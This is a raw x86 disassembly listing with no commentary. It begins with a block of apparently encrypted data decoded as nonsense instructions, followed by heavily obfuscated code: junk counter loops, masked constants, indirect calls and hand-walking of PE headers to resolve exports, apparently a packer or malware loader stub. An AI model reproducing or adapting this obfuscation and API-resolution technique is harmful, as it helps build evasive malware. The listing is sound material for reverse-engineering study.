  422278:	lods   al,BYTE PTR ds:[esi]
  422279:	fidiv  WORD PTR [edx-0x3d6b1746]
  42227f:	push   0x7cf19042
  422284:	xor    DWORD PTR [edx],ecx
  422286:	sbb    esi,DWORD PTR [edx-0x3c]
  422289:	fcmovne st,st(0)
  42228b:	xor    al,bl
  42228d:	fs push es
  42228f:	fwait
  422290:	repz jecxz 0x422268
  422293:	sub    al,0x2f
  422295:	adc    DWORD PTR [esi+edx*2-0x32],esi
  422299:	popf   
  42229a:	adc    DWORD PTR ds:0xed4597cb,ecx
  4222a0:	ins    DWORD PTR es:[edi],dx
  4222a1:	push   ds
  4222a2:	mov    ds:0xfb477d87,al
  4222a7:	pop    esp
  4222a8:	jnp    0x422261
  4222aa:	push   ebp
  4222ab:	jne    0x4222ee
  4222ad:	and    eax,0x16d5e121
  4222b2:	mov    ds:0xe2ce9506,eax
  4222b7:	mov    al,ds:0x8f8c0a51
  4222bc:	es mov dl,0xc
  4222bf:	scas   al,BYTE PTR es:[edi]
  4222c0:	dec    esi
  4222c1:	mov    ecx,DWORD PTR [ecx-0x5ae4c669]
  4222c7:	loop   0x42226d
  4222c9:	mov    ebx,0xece93f2e
  4222ce:	xchg   BYTE PTR [ebx+0x6a8973cf],ch
  4222d4:	les    ecx,FWORD PTR [edx-0x43fd5575]
  4222da:	test   eax,0x2cd11291
  4222df:	jnp    0x422307
  4222e1:	mov    DWORD PTR [ebx-0x15],ecx
  4222e4:	jno    0x4222bf
  4222e6:	adc    bh,BYTE PTR [edi+edx*1-0x3a]
  4222ea:	aas    
  4222eb:	inc    ebp
  4222ec:	dec    ebp
  4222ed:	pop    edi
  4222ee:	inc    edx
  4222ef:	push   edi
  4222f0:	sbb    eax,0xa1bacedc
  4222f5:	mov    eax,ds:0xcc56e844
  4222fa:	jecxz  0x422286
  4222fc:	sbb    dl,BYTE PTR [eax+0x78efc182]
  422302:	je     0x42235e
  422304:	push   es
  422305:	cli    
  422306:	rol    eax,cl
  422308:	daa    
  422309:	mov    bh,0xbd
  42230b:	inc    eax
  42230c:	mov    ebp,0x6ea54391
  422311:	mov    eax,ds:0xe35837d1
  422316:	dec    esp
  422317:	div    DWORD PTR [edx+0x6fe347d3]
  42231d:	xor    eax,0x1c22aadb
  422322:	fidivr WORD PTR [edx+0x26]
  422325:	test   al,0x3b
  422327:	clc    
  422328:	fsubrp st(3),st
  42232a:	outs   dx,DWORD PTR ds:[esi]
  42232b:	sbb    dl,BYTE PTR [edx]
  42232d:	mov    ds:0x45c07c8a,al
  422332:	mov    ds:0xe6f7770b,eax
  422337:	sub    bh,BYTE PTR [edx+ebp*2-0x3fb8eab2]
  42233e:	stos   BYTE PTR es:[edi],al
  42233f:	mov    ah,0xdb
  422341:	ins    BYTE PTR es:[edi],dx
  422342:	loopne 0x4223a4
  422344:	(bad)  
  422345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422346:	or     eax,0x151b53d4
  42234b:	dec    ecx
  42234c:	imul   esi,DWORD PTR [esi+0x22bdc670],0xffffffde
  422353:	lods   eax,DWORD PTR ds:[esi]
  422354:	xchg   edx,eax
  422355:	jo     0x42234d
  422357:	adc    bh,BYTE PTR [edi]
  422359:	repnz add eax,0x43a0820c
  42235f:	xchg   esi,eax
  422360:	test   BYTE PTR [edx+ecx*1],0x80
  422364:	(bad)  
  422366:	xchg   esi,eax
  422367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422368:	add    al,BYTE PTR [ecx-0x2f6583a]
  42236e:	add    esi,DWORD PTR [esi-0x29]
  422371:	mov    al,ds:0xd27b4527
  422376:	ins    DWORD PTR es:[edi],dx
  422377:	adc    DWORD PTR [ebx+ecx*8],ecx
  42237a:	call   edx
  42237c:	rcl    BYTE PTR [eax-0x705ed176],1
  422382:	mov    ch,bl
  422384:	xor    dh,bh
  422386:	dec    ebp
  422387:	in     eax,dx
  422388:	ds (bad) 
  42238b:	mov    ecx,0x6417d47c
  422390:	cld    
  422391:	push   esi
  422392:	test   eax,0x3233299b
  422397:	cmp    ecx,esi
  422399:	mov    eax,0xf09ea78b
  42239e:	xor    eax,0x4ca8629
  4223a3:	pop    ecx
  4223a4:	fsub   st,st(3)
  4223a6:	pop    edi
  4223a7:	push   0x9cdbce3d
  4223ac:	xchg   DWORD PTR ds:0xf4fd7af,ebp
  4223b2:	xchg   edx,eax
  4223b3:	cdq    
  4223b4:	pop    esi
  4223b5:	cmp    BYTE PTR [ebx+0xff52ddf],al
  4223bb:	cmc    
  4223bc:	ins    DWORD PTR es:[edi],dx
  4223bd:	jo     0x422401
  4223bf:	test   BYTE PTR [edx],dl
  4223c1:	stos   DWORD PTR es:[edi],eax
  4223c2:	or     ebp,ecx
  4223c4:	fld    TBYTE PTR [edi]
  4223c6:	loopne 0x42242a
  4223c8:	adc    eax,0x90556d32
  4223cd:	std    
  4223ce:	xchg   edi,eax
  4223cf:	sbb    eax,0x27487c7d
  4223d4:	js     0x422425
  4223d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223d7:	shl    BYTE PTR [edx],cl
  4223d9:	int3   
  4223da:	stos   DWORD PTR es:[edi],eax
  4223db:	push   ds
  4223dc:	int3   
  4223dd:	test   al,0x9c
  4223df:	out    0xa6,eax
  4223e1:	inc    ecx
  4223e2:	mov    ch,0xea
  4223e4:	mov    eax,0x58e3a047
  4223e9:	stos   BYTE PTR es:[edi],al
  4223ea:	mov    ecx,0x8ac60c2
  4223ef:	cdq    
  4223f0:	rcl    DWORD PTR [esi-0x4cbef1f4],0xf0
  4223f7:	push   cs
  4223f8:	loopne 0x422393
  4223fa:	dec    BYTE PTR [edi-0x108fa552]
  422400:	push   ebp
  422401:	or     ecx,DWORD PTR [edx-0x512d9f8c]
  422407:	push   esi
  422408:	dec    ebx
  422409:	dec    ebx
  42240a:	repnz out dx,eax
  42240c:	mov    ebx,0xba0aad77
  422411:	push   ebx
  422412:	test   al,0xe6
  422414:	push   ebp
  422415:	les    ebp,FWORD PTR [edx-0x64f1552e]
  42241b:	mov    cl,0x11
  42241d:	stos   DWORD PTR es:[edi],eax
  42241e:	cmp    eax,0x62b3c2f1
  422423:	jb     0x42242b
  422425:	mov    ebp,0x1f1c3dfb
  42242a:	pop    edx
  42242b:	adc    ah,BYTE PTR ss:[edx+0x67]
  42242f:	xchg   BYTE PTR [esp+eiz*8-0x3d],bl
  422433:	xchg   edx,eax
  422434:	adc    BYTE PTR [ebp-0x4],0x19
  422438:	lods   al,BYTE PTR ds:[esi]
  422439:	ins    BYTE PTR es:[edi],dx
  42243a:	xchg   edx,eax
  42243b:	push   ebx
  42243c:	pop    ds
  42243d:	xchg   ecx,eax
  42243e:	popf   
  42243f:	out    0xe7,al
  422441:	(bad)  
  422442:	jnp    0x42243f
  422444:	ins    DWORD PTR es:[edi],dx
  422445:	pop    ss
  422446:	clc    
  422447:	pop    ds
  422448:	bound  ecx,QWORD PTR [ebx-0x3a42c4ec]
  42244e:	retf   0xadb7
  422451:	sbb    cl,BYTE PTR [ebp-0x6]
  422454:	sub    al,0x86
  422456:	ret    
  422457:	ins    BYTE PTR es:[edi],dx
  422458:	jns    0x422470
  42245a:	(bad)  
  42245b:	push   0x2ccf692a
  422460:	fbstp  TBYTE PTR [ecx]
  422462:	in     al,dx
  422463:	add    BYTE PTR [ebx+0x71],bh
  422466:	fild   DWORD PTR [eax+0x3c223af1]
  42246c:	es ins BYTE PTR es:[edi],dx
  42246e:	fisubr DWORD PTR ss:[edi-0x52]
  422472:	sub    esi,DWORD PTR [eax-0x4a9df93]
  422478:	arpl   WORD PTR [eax],bx
  42247a:	mov    ch,0x6c
  42247c:	sbb    ah,dh
  42247e:	inc    ebx
  42247f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422480:	inc    esi
  422481:	arpl   WORD PTR [eax+0x5f],bp
  422484:	div    bl
  422486:	int    0x78
  422488:	(bad)  
  422489:	in     al,0x9
  42248b:	inc    edi
  42248c:	mov    ds:0xa42a4534,eax
  422491:	mov    cl,0x3f
  422493:	cmp    eax,0x1de2e66
  422498:	out    dx,eax
  422499:	aas    
  42249a:	lods   al,BYTE PTR ds:[esi]
  42249b:	sahf   
  42249c:	xor    eax,0xdc75ffd6
  4224a1:	mov    BYTE PTR [eax],0xe9
  4224a4:	mov    eax,ds:0x42a2ee
  4224a9:	push   DWORD PTR [eax]
  4224ab:	push   DWORD PTR ds:0x42a552
  4224b1:	push   DWORD PTR ds:0x42a2f6
  4224b7:	push   DWORD PTR ds:0x42a532
  4224bd:	push   DWORD PTR ds:0x42af72
  4224c3:	push   DWORD PTR [ebp-0x28]
  4224c6:	push   DWORD PTR [ebp-0x2c]
  4224c9:	mov    eax,DWORD PTR [ebp-0x14]
  4224cc:	call   eax
  4224ce:	pop    edi
  4224cf:	pop    esi
  4224d0:	leave  
  4224d1:	ret    
  4224d2:	push   ebp
  4224d3:	mov    ebp,esp
  4224d5:	sub    esp,0x34
  4224d8:	push   ebx
  4224d9:	adc    edx,DWORD PTR ds:0x42b1aa
  4224df:	push   esi
  4224e0:	movzx  ecx,BYTE PTR ds:0x42b1ea
  4224e7:	sbb    DWORD PTR ds:0x42b21a,ecx
  4224ed:	push   edi
  4224ee:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  4224f5:	and    DWORD PTR ds:0x42b1c6,0x0
  4224ff:	mov    ecx,DWORD PTR ds:0x42b1c6
  422505:	inc    ecx
  422506:	mov    DWORD PTR ds:0x42b1c6,ecx
  42250c:	cmp    DWORD PTR ds:0x42b1c6,0xd
  422513:	jg     0x422552
  422519:	jmp    0x422529
  42251e:	push   0x42b1ba
  422523:	call   DWORD PTR ds:0x42b2f6
  422529:	cmp    DWORD PTR ds:0x42b1c6,0xc
  422530:	jne    0x422545
  422536:	xor    ecx,ecx
  422538:	xor    ecx,DWORD PTR ds:0x42b1c6
  42253e:	inc    ecx
  42253f:	mov    DWORD PTR ds:0x42b1c6,ecx
  422545:	cmp    DWORD PTR ds:0x42b1c6,0x1b
  42254c:	jb     0x4224ff
  422552:	lea    eax,[ebp+0x14]
  422555:	mov    DWORD PTR [ebp-0x4],eax
  422558:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  42255f:	lea    eax,[ebp-0xc]
  422562:	mov    DWORD PTR ds:0x42b19e,0x11
  42256c:	cmp    DWORD PTR ds:0x42b19e,0x0
  422573:	je     0x4225cf
  422579:	cmp    DWORD PTR ds:0x42b19e,0x2
  422580:	jge    0x4225cf
  422586:	jmp    0x4225a3
  42258b:	push   0x42b1fa
  422590:	push   0x42b222
  422595:	push   DWORD PTR [ebp-0x28]
  422598:	push   0x42a03d
  42259d:	call   DWORD PTR ds:0x42b2fa
  4225a3:	cmp    DWORD PTR ds:0x42b19e,0x3
  4225aa:	jne    0x4225bd
  4225b0:	mov    esi,DWORD PTR ds:0x42b19e
  4225b6:	dec    esi
  4225b7:	mov    DWORD PTR ds:0x42b19e,esi
  4225bd:	mov    esi,DWORD PTR ds:0x42b19e
  4225c3:	dec    esi
  4225c4:	mov    DWORD PTR ds:0x42b19e,esi
  4225ca:	jmp    0x42256c
  4225cf:	mov    DWORD PTR [ebp-0x14],eax
  4225d2:	and    DWORD PTR ds:0x42b1f2,0x0
  4225dc:	jmp    0x4225ee
  4225e1:	mov    esi,DWORD PTR ds:0x42b1f2
  4225e7:	inc    esi
  4225e8:	mov    DWORD PTR ds:0x42b1f2,esi
  4225ee:	cmp    DWORD PTR ds:0x42b1f2,0x1a
  4225f5:	jae    0x422622
  4225fb:	cmp    DWORD PTR ds:0x42b1f2,0x2a
  422602:	jle    0x422622
  422608:	jmp    0x42261d
  42260d:	push   0x42b1ca
  422612:	push   0x42a18d
  422617:	call   DWORD PTR ds:0x42b2fe
  42261d:	jmp    0x4225e1
  422622:	mov    eax,DWORD PTR [ebp-0xc]
  422625:	mov    DWORD PTR ds:0x42b202,0x1d
  42262f:	cmp    DWORD PTR ds:0x42b202,0x0
  422636:	je     0x422692
  42263c:	cmp    DWORD PTR ds:0x42b202,0xb
  422643:	jbe    0x422692
  422649:	jmp    0x422664
  42264e:	push   DWORD PTR [ebp-0x28]
  422651:	push   0x8416
  422656:	push   0x42a285
  42265b:	push   DWORD PTR [ebp-0xc]
  42265e:	call   DWORD PTR ds:0x42b306
  422664:	cmp    DWORD PTR ds:0x42b202,0xc
  42266b:	jne    0x42267e
  422671:	mov    esi,DWORD PTR ds:0x42b202
  422677:	dec    esi
  422678:	mov    DWORD PTR ds:0x42b202,esi
  42267e:	xor    esi,esi
  422680:	add    esi,DWORD PTR ds:0x42b202
  422686:	dec    esi
  422687:	mov    DWORD PTR ds:0x42b202,esi
  42268d:	jmp    0x42262f
  422692:	mov    edx,DWORD PTR [ebp-0x14]
  422695:	xor    esi,ecx
  422697:	mov    ecx,0x75108ae
  42269c:	sbb    esi,0x78cf
  4226a2:	xor    eax,ecx
  4226a4:	add    eax,0x3272f5
  4226a9:	mov    DWORD PTR [edx],eax
  4226ab:	xor    eax,eax
  4226ad:	or     eax,DWORD PTR ds:0x42b2b6
  4226b3:	mov    eax,DWORD PTR [eax]
  4226b5:	and    DWORD PTR ds:0x42b1c2,eax
  4226bb:	mov    eax,ds:0x42a2ea
  4226c0:	mov    edx,DWORD PTR [ebp-0x4]
  4226c3:	movzx  esi,BYTE PTR ds:0x42b1b2
  4226ca:	adc    DWORD PTR ds:0x42b206,esi
  4226d0:	mov    eax,DWORD PTR [eax]
  4226d2:	add    eax,DWORD PTR [edx]
  4226d4:	and    DWORD PTR ds:0x42b1ee,ecx
  4226da:	mov    DWORD PTR [ebp-0x8],eax
  4226dd:	mov    esi,DWORD PTR [ebp+0x8]
  4226e0:	and    DWORD PTR ds:0x42b1b2,0x0
  4226ea:	jmp    0x4226fa
  4226ef:	mov    eax,ds:0x42b1b2
  4226f4:	inc    eax
  4226f5:	mov    ds:0x42b1b2,eax
  4226fa:	cmp    DWORD PTR ds:0x42b1b2,0x15
  422701:	jae    0x422746
  422707:	cmp    DWORD PTR ds:0x42b1b2,0x9
  42270e:	jbe    0x422746
  422714:	jmp    0x422729
  422719:	push   0x42a26b
  42271e:	push   0x0
  422720:	push   DWORD PTR [ebp-0x28]
  422723:	call   DWORD PTR ds:0x42b30e
  422729:	cmp    DWORD PTR ds:0x42b1b2,0x8
  422730:	jne    0x422741
  422736:	mov    eax,ds:0x42b1b2
  42273b:	inc    eax
  42273c:	mov    ds:0x42b1b2,eax
  422741:	jmp    0x4226ef
  422746:	mov    eax,ds:0x42a472
  42274b:	mov    DWORD PTR ds:0x42b21e,0x16
  422755:	cmp    DWORD PTR ds:0x42b21e,0x0
  42275c:	je     0x42278f
  422762:	cmp    DWORD PTR ds:0x42b21e,0x19
  422769:	jbe    0x42278f
  42276f:	jmp    0x42277d
  422774:	push   DWORD PTR [ebp-0x20]
  422777:	call   DWORD PTR ds:0x42b316
  42277d:	mov    edx,DWORD PTR ds:0x42b21e
  422783:	dec    edx
  422784:	mov    DWORD PTR ds:0x42b21e,edx
  42278a:	jmp    0x422755
  42278f:	mov    eax,DWORD PTR [eax+0x198]
  422795:	movzx  edx,WORD PTR ds:0x42b18e
  42279c:	xor    edx,DWORD PTR ds:0x42b1d6
  4227a2:	mov    DWORD PTR ds:0x42b18e,edx
  4227a8:	xor    esi,ecx
  4227aa:	and    DWORD PTR ds:0x42b1c2,0x42b1b2
  4227b4:	mov    edx,0x3272f5
  4227b9:	add    DWORD PTR ds:0x42b1ce,0x42b1c2
  4227c3:	add    esi,edx
  4227c5:	mov    DWORD PTR ds:0x42b1be,0x75ce
  4227cf:	cmp    DWORD PTR [eax],esi
  4227d1:	je     0x4227e8
  4227d7:	mov    eax,DWORD PTR [eax]
  4227d9:	mov    DWORD PTR ds:0x42b18e,0x18de
  4227e3:	jmp    0x422b4e
  4227e8:	mov    eax,DWORD PTR [ebp+0x18]
  4227eb:	mov    esi,DWORD PTR ds:0x42b1ee
  4227f1:	adc    DWORD PTR ds:0x42b212,esi
  4227f7:	mov    esi,DWORD PTR [ebp+0x1c]
  4227fa:	or     ebx,0xffffffff
  4227fd:	mov    DWORD PTR ds:0x42b21a,0x5f57
  422807:	cmp    eax,0x70941f95
  42280c:	mov    DWORD PTR ds:0x42b19e,0x397d
  422816:	jne    0x422857
  42281c:	mov    DWORD PTR ds:0x42b196,0x41c1
  422826:	cmp    esi,ebx
  422828:	mov    DWORD PTR ds:0x42b18e,0x6f0
  422832:	jne    0x422857
  422838:	mov    DWORD PTR ds:0x42b1e6,0x1213
  422842:	push   ebx
  422843:	push   0x70941f94
  422848:	mov    DWORD PTR ds:0x42b1ea,0x77db
  422852:	jmp    0x422b3d
  422857:	mov    eax,DWORD PTR [ebp+0x18]
  42285a:	mov    esi,DWORD PTR [ebp+0x1c]
  42285d:	mov    DWORD PTR ds:0x42b1f6,0x6621
  422867:	cmp    eax,0x70941f94
  42286c:	jne    0x422899
  422872:	mov    DWORD PTR ds:0x42b1d2,0x1239
  42287c:	cmp    esi,ebx
  42287e:	mov    DWORD PTR ds:0x42b1ea,0x2737
  422888:	jne    0x422899
  42288e:	push   ebx
  42288f:	push   0x70941f97
  422894:	jmp    0x422b3d
  422899:	mov    eax,DWORD PTR [ebp+0x18]
  42289c:	mov    esi,DWORD PTR [ebp+0x1c]
  42289f:	cmp    eax,0x70941f97
  4228a4:	jne    0x4228c7
  4228aa:	mov    DWORD PTR ds:0x42b1ba,0x121e
  4228b4:	cmp    esi,ebx
  4228b6:	jne    0x4228c7
  4228bc:	push   ebx
  4228bd:	push   0x70941f96
  4228c2:	jmp    0x422b3d
  4228c7:	mov    eax,DWORD PTR [ebp+0x18]
  4228ca:	mov    DWORD PTR ds:0x42b202,0x572d
  4228d4:	mov    esi,DWORD PTR [ebp+0x1c]
  4228d7:	cmp    eax,0x70941f96
  4228dc:	mov    DWORD PTR ds:0x42b1aa,0x369b
  4228e6:	jne    0x42291d
  4228ec:	cmp    esi,ebx
  4228ee:	jne    0x42291d
  4228f4:	mov    DWORD PTR ds:0x42b18a,0xe5c
  4228fe:	push   ebx
  4228ff:	mov    DWORD PTR ds:0x42b22e,0x5e71
  422909:	push   0x70941f99
  42290e:	mov    DWORD PTR ds:0x42b1d6,0x2b39
  422918:	jmp    0x422b3d
  42291d:	mov    DWORD PTR ds:0x42b1da,edi
  422923:	mov    esi,DWORD PTR [ebp+0x18]
  422926:	mov    eax,0x5593
  42292b:	mov    edi,DWORD PTR [ebp+0x1c]
  42292e:	mov    eax,0x70941f98
  422933:	mov    DWORD PTR ds:0x42b1a2,0x1ef3
  42293d:	cmp    esi,eax
  42293f:	mov    DWORD PTR ds:0x42b1be,0x2a6e
  422949:	jne    0x422b21
  42294f:	cmp    edi,ebx
  422951:	mov    DWORD PTR ds:0x42b19e,0x8e7
  42295b:	jne    0x422b21
  422961:	sbb    DWORD PTR ds:0x42b1ea,0x3412
  42296b:	mov    eax,DWORD PTR [ebp+0x10]
  42296e:	or     edi,edi
  422970:	xor    eax,ecx
  422972:	sbb    DWORD PTR ds:0x42b1c2,edx
  422978:	add    eax,edx
  42297a:	mov    DWORD PTR [ebp-0x20],eax
  42297d:	mov    eax,DWORD PTR [ebp+0xc]
  422980:	mov    esi,DWORD PTR [ebp-0x8]
  422983:	xor    eax,ecx
  422985:	add    eax,edx
  422987:	imul   eax,DWORD PTR [esi]
  42298a:	mov    esi,DWORD PTR [ebp+0x8]
  42298d:	xor    esi,ecx
  42298f:	add    esi,edx
  422991:	cmp    esi,eax
  422993:	mov    eax,DWORD PTR [ebp-0x4]
  422996:	mov    edi,0xffcd8d0b
  42299b:	je     0x4229ba
  4229a1:	mov    esi,DWORD PTR [ebp-0x20]
  4229a4:	add    DWORD PTR [eax],esi
  4229a6:	mov    eax,DWORD PTR [ebp-0x4]
  4229a9:	mov    esi,DWORD PTR [ebp+0xc]
  4229ac:	xor    esi,ecx
  4229ae:	add    esi,edx
  4229b0:	imul   esi,DWORD PTR [eax]
  4229b3:	mov    DWORD PTR [eax],esi
  4229b5:	jmp    0x4229bf
  4229ba:	mov    esi,DWORD PTR [ebp+0x14]
  4229bd:	xor    DWORD PTR [eax],esi
  4229bf:	mov    eax,DWORD PTR [ebp-0x4]
  4229c2:	mov    esi,DWORD PTR [ebp+0x10]
  4229c5:	xor    esi,ecx
  4229c7:	sub    edi,esi
  4229c9:	add    DWORD PTR [eax],edi
  4229cb:	mov    eax,DWORD PTR [ebp-0x4]
  4229ce:	mov    esi,DWORD PTR [ebp-0x8]
  4229d1:	add    esi,DWORD PTR [eax]
  4229d3:	mov    DWORD PTR [ebp-0x8],esi
  4229d6:	mov    eax,DWORD PTR [ebp+0xc]
  4229d9:	mov    esi,DWORD PTR [ebp+0xc]
  4229dc:	xor    esi,ecx
  4229de:	xor    eax,ecx
  4229e0:	lea    eax,[eax+esi*1+0x64e5ea]
  4229e7:	mov    esi,DWORD PTR [ebp+0xc]
  4229ea:	xor    esi,ecx
  4229ec:	add    esi,edx
  4229ee:	imul   eax,esi
  4229f1:	mov    esi,DWORD PTR [ebp+0xc]
  4229f4:	xor    esi,ecx
  4229f6:	sub    esi,eax
  4229f8:	mov    eax,DWORD PTR [ebp-0x4]
  4229fb:	add    esi,edx
  4229fd:	cmp    DWORD PTR [eax],esi
  4229ff:	mov    eax,DWORD PTR [ebp-0x4]
  422a02:	mov    esi,DWORD PTR [ebp+0x10]
  422a05:	jg     0x422a1b
  422a0b:	xor    esi,ecx
  422a0d:	mov    edi,0xffcd8d0b
  422a12:	sub    edi,esi
  422a14:	add    DWORD PTR [eax],edi
  422a16:	jmp    0x422a21
  422a1b:	xor    esi,ecx
  422a1d:	add    esi,edx
  422a1f:	add    DWORD PTR [eax],esi
  422a21:	mov    eax,DWORD PTR [ebp-0x8]
  422a24:	mov    esi,DWORD PTR [ebp-0x10]
  422a27:	mov    eax,DWORD PTR [eax]
  422a29:	xor    esi,ecx
  422a2b:	add    esi,0x3272f4
  422a31:	mov    DWORD PTR [ebp-0x28],0x7097b860
  422a38:	mov    DWORD PTR [ebp-0x24],ebx
  422a3b:	not    esi
  422a3d:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  422a44:	mov    DWORD PTR [ebp-0x2c],ebx
  422a47:	mov    ebx,DWORD PTR [ebp-0x28]
  422a4a:	mov    edi,DWORD PTR [ebp-0x24]
  422a4d:	and    eax,esi
  422a4f:	mov    esi,0xa141
  422a54:	xor    bx,si
  422a57:	mov    esi,0x412c
  422a5c:	add    bx,si
  422a5f:	cmp    WORD PTR [eax],bx
  422a62:	je     0x422aac
  422a68:	mov    edi,DWORD PTR [ebp-0x10]
  422a6b:	xor    edi,ecx
  422a6d:	mov    DWORD PTR [ebp-0x28],0x7097b860
  422a74:	mov    DWORD PTR [ebp-0x24],0xffffffff
  422a7b:	mov    ebx,0xffcd8d0b
  422a80:	sub    ebx,edi
  422a82:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  422a89:	add    eax,ebx
  422a8b:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  422a92:	mov    edi,DWORD PTR [ebp-0x28]
  422a95:	mov    ebx,DWORD PTR [ebp-0x24]
  422a98:	mov    ebx,0xa141
  422a9d:	xor    di,bx
  422aa0:	add    di,si
  422aa3:	cmp    WORD PTR [eax],di
  422aa6:	jne    0x422a68
  422aac:	mov    edi,DWORD PTR [ebp-0x14]
  422aaf:	mov    edi,DWORD PTR [edi]
  422ab1:	mov    ebx,DWORD PTR [eax+0x3c]
  422ab4:	lea    edi,[ebx+edi*8+0x78]
  422ab8:	mov    edi,DWORD PTR [edi+eax*1]
  422abb:	mov    DWORD PTR [ebp-0x18],edi
  422abe:	mov    edi,DWORD PTR [ebp+0x8]
  422ac1:	xor    edi,ecx
  422ac3:	add    edi,edx
  422ac5:	mov    DWORD PTR [ebp-0x1c],edi
  422ac8:	mov    edi,DWORD PTR [ebp+0x8]
  422acb:	xor    edi,ecx
  422acd:	mov    ecx,DWORD PTR [ebp-0x18]
  422ad0:	add    edi,edx
  422ad2:	cmp    ecx,edi
  422ad4:	je     0x422b16
  422ada:	mov    ecx,DWORD PTR [ebp-0x18]
  422add:	add    ecx,eax
  422adf:	mov    DWORD PTR [ebp-0x1c],ecx
  422ae2:	mov    ecx,DWORD PTR [ebp-0x30]
  422ae5:	mov    edx,DWORD PTR [ebp-0x2c]
  422ae8:	mov    edx,0xa141
  422aed:	xor    cx,dx
  422af0:	mov    edx,DWORD PTR [ebp-0x1c]
  422af3:	mov    edx,DWORD PTR [edx+0xc]
  422af6:	add    cx,si
  422af9:	cmp    WORD PTR [eax+edx*1],cx
  422afd:	jne    0x422b16
  422b03:	mov    ecx,DWORD PTR ds:0x42a472
  422b09:	mov    ecx,DWORD PTR [ecx+0x198]
  422b0f:	mov    DWORD PTR [ecx],eax
  422b11:	jmp    0x422b4e
  422b16:	push   DWORD PTR [ebp+0x1c]
  422b19:	push   DWORD PTR [ebp+0x18]
  422b1c:	jmp    0x422b3d
  422b21:	mov    ecx,DWORD PTR [ebp+0x18]
  422b24:	mov    edx,DWORD PTR [ebp+0x1c]
  422b27:	cmp    ecx,0x70941f99
  422b2d:	jne    0x422b4e
  422b33:	cmp    edx,ebx
  422b35:	jne    0x422b4e
  422b3b:	push   ebx
  422b3c:	push   eax
  422b3d:	push   DWORD PTR [ebp+0x14]
  422b40:	push   DWORD PTR [ebp+0x10]
  422b43:	push   DWORD PTR [ebp+0xc]
  422b46:	push   DWORD PTR [ebp+0x8]
  422b49:	call   0x4224d2
  422b4e:	pop    edi
  422b4f:	pop    esi
  422b50:	pop    ebx
  422b51:	leave  
  422b52:	ret    0x18
  422b55:	push   ebp
  422b56:	mov    ebp,esp
  422b58:	and    esp,0xfffffff8
  422b5b:	sub    esp,0x3fc
  422b61:	or     DWORD PTR ds:0x42b1a6,0x42b1c2
  422b6b:	push   ebx
  422b6c:	xor    DWORD PTR ds:0x42b216,0x42b1b6
  422b76:	push   esi
  422b77:	push   edi
  422b78:	or     DWORD PTR ds:0x42b19e,0x42b192
  422b82:	lea    eax,[esp+0x1b8]
  422b89:	push   eax
  422b8a:	sub    DWORD PTR ds:0x42b222,0x377b
  422b94:	push   0x42a596
  422b99:	call   DWORD PTR ds:0x42b312
  422b9f:	mov    DWORD PTR ds:0x42b1ee,0x356c
  422ba9:	cmp    eax,0xffffffff
  422bac:	mov    DWORD PTR ds:0x42b1d6,0x3f42
  422bb6:	je     0x422bf9
  422bbc:	sub    DWORD PTR ds:0x42b206,0x3b29
  422bc6:	push   0x42a5ca
  422bcb:	adc    DWORD PTR ds:0x42b1a6,0xd7b
  422bd5:	push   0x89677644
  422bda:	adc    DWORD PTR ds:0x42b226,0x42b22a
  422be4:	call   DWORD PTR ds:0x42b2e2
  422bea:	mov    DWORD PTR ds:0x42b1da,0xf4c
  422bf4:	jmp    0x423de7
  422bf9:	and    DWORD PTR ds:0x42b202,0xcb9
  422c03:	mov    esi,DWORD PTR ds:0x42b302
  422c09:	add    DWORD PTR ds:0x42b21e,0x42b22a
  422c13:	push   0xf
  422c15:	lea    eax,[esp+0x44]
  422c19:	push   eax
  422c1a:	push   0x42a5de
  422c1f:	push   0x42a5f2
  422c24:	mov    DWORD PTR ds:0x42b19a,0x6718
  422c2e:	push   0x42a616
  422c33:	add    DWORD PTR ds:0x42b1fe,0x42b1be
  422c3d:	call   esi
  422c3f:	imul   eax,eax,0x300000
  422c45:	cmp    eax,0x1b00000
  422c4a:	mov    DWORD PTR ds:0x42b1a6,0x2dc4
  422c54:	je     0x422c6b
  422c5a:	xor    eax,eax
  422c5c:	mov    DWORD PTR ds:0x42b18e,0x4419
  422c66:	jmp    0x423de7
  422c6b:	add    DWORD PTR ds:0x42b19e,0x42b1e6
  422c75:	lea    eax,[esp+0x78]
  422c79:	or     DWORD PTR ds:0x42b1b2,0x1042
  422c83:	push   eax
  422c84:	add    DWORD PTR ds:0x42b1a6,0x42b1e2
  422c8e:	push   0xffffffff
  422c90:	xor    DWORD PTR ds:0x42b1be,0x42b22a
  422c9a:	call   DWORD PTR ds:0x42b30a
  422ca0:	test   eax,eax
  422ca2:	mov    DWORD PTR ds:0x42b192,0x385a
  422cac:	jne    0x422c5a
  422cb2:	and    DWORD PTR ds:0x42b1de,0x0
  422cbc:	jmp    0x422cce
  422cc1:	mov    edi,DWORD PTR ds:0x42b1de
  422cc7:	inc    edi
  422cc8:	mov    DWORD PTR ds:0x42b1de,edi
  422cce:	cmp    DWORD PTR ds:0x42b1de,0x1d
  422cd5:	jae    0x422d1a
  422cdb:	cmp    DWORD PTR ds:0x42b1de,0xe
  422ce2:	jg     0x422d1a
  422ce8:	jmp    0x422cf9
  422ced:	push   DWORD PTR [ebp-0x10]
  422cf0:	push   DWORD PTR [ebp-0x14]
  422cf3:	call   DWORD PTR ds:0x42b31a
  422cf9:	cmp    DWORD PTR ds:0x42b1de,0xd
  422d00:	jne    0x422d15
  422d06:	xor    edi,edi
  422d08:	or     edi,DWORD PTR ds:0x42b1de
  422d0e:	inc    edi
  422d0f:	mov    DWORD PTR ds:0x42b1de,edi
  422d15:	jmp    0x422cc1
  422d1a:	mov    DWORD PTR [esp+0x30],eax
  422d1e:	mov    ecx,0xf89c85a5
  422d23:	and    DWORD PTR ds:0x42b20e,0x0
  422d2d:	mov    edx,DWORD PTR ds:0x42b20e
  422d33:	inc    edx
  422d34:	mov    DWORD PTR ds:0x42b20e,edx
  422d3a:	cmp    DWORD PTR ds:0x42b20e,0x21
  422d41:	jl     0x422d73
  422d47:	jmp    0x422d66
  422d4c:	push   0x42b1a2
  422d51:	push   0x1a2f
  422d56:	push   0x42a26b
  422d5b:	push   0x42a000
